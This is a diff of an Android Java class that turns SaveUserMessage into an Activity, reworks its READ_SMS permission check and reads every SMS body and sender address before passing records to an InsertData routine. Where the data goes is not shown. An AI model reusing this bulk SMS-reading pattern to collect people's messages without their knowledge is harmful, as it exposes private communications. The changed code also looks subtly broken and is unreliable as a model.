@@ -29,27 +29,30 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
-public class SaveUserMessage {
+public class SaveUserMessage extends AppCompatActivity {
 
     //private static MainActivity inst;
 
 
     //private
-    private static Context context;
+    public Context context;
     //private static ContentResolver contentResolver;
 
     ///////////////////le context de l'application///////////////////
-    protected SaveUserMessage(Context context) {
+    public SaveUserMessage(Context context) {
         this.context = context;
     }
 
     protected void SaveUserMessages() {
-        if (ContextCompat.checkSelfPermission(context, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+        //if (ContextCompat.checkSelfPermission(getBaseContext(), "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
 
+                return;
+            }
             //SaveUserMessage ctx = new SaveUserMessage(context);
 
 
-            ContentResolver contentResolver = context.getContentResolver();
+            ContentResolver contentResolver = getContentResolver();
             Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
             int indexBody = smsInboxCursor.getColumnIndex("body");
             int indexAddress = smsInboxCursor.getColumnIndex("address");
@@ -69,7 +72,7 @@ public class SaveUserMessage {
             smsInboxCursor.close();
             //InsertData("papa","pa@mail.com");
             //}
-        }
+
     }
 
         protected void InsertData ( final int id_user, final int id_message,
